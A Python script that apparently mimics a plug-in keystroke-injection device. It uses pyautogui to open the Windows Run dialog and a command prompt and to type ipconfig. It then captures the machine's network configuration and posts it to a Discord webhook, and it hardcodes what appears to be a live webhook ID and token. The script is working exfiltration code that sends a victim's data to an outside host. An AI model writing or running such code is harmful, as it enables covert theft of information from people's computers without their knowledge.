import subprocess
import time
import sys
import pyautogui
import requests

# Function to install pyautogui and requests if they're not installed
def install_required_modules():
    try:
        import pyautogui
    except ImportError:
        print("Installing pyautogui...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyautogui"])

    try:
        import requests
    except ImportError:
        print("Installing requests...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])

# Install pyautogui and requests
install_required_modules()

# Webhook URL to send the IP address
WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"

# Function to send a message to Discord Webhook
def send_to_discord(message):
    data = {"content": message}
    response = requests.post(WEBHOOK_URL, json=data)
    if response.status_code == 204:
        print("Successfully sent to Discord Webhook.")
    else:
        print(f"Failed to send message: {response.status_code}")

# Wait a moment to simulate the delay after the device is plugged in
time.sleep(2)

# Simulate opening the Run dialog (Win + R)
pyautogui.hotkey('win', 'r')  # Simulates Win + R
time.sleep(1)

# Open a web browser and navigate to Discord Webhook (in this case opening the Discord link directly)
url = "https://discord.com/api/webhooks/1329516594887659611/FEgNHjHO6JzJ_AcclPtkHiTKsfZ-gRtz3j0jUlSbv_yAjbUODrj-s-bXCm65tilMBriQ"
pyautogui.write(url)
pyautogui.press('enter')

# Wait for the browser to open (optional)
time.sleep(2)

# Open command prompt (Win + R, then type 'cmd')
pyautogui.hotkey('win', 'r')  # Open Run dialog again
time.sleep(1)
pyautogui.write('cmd')
pyautogui.press('enter')
time.sleep(1)

# Simulate typing the 'ipconfig' command and pressing enter
pyautogui.write('ipconfig')
pyautogui.press('enter')

# Wait for the command to execute and display the output
time.sleep(2)

# Capture IP address from 'ipconfig' using subprocess
ipconfig_output = subprocess.check_output("ipconfig", universal_newlines=True)

# Send the output to Discord Webhook
send_to_discord(f"IP Configuration:\n{ipconfig_output}")
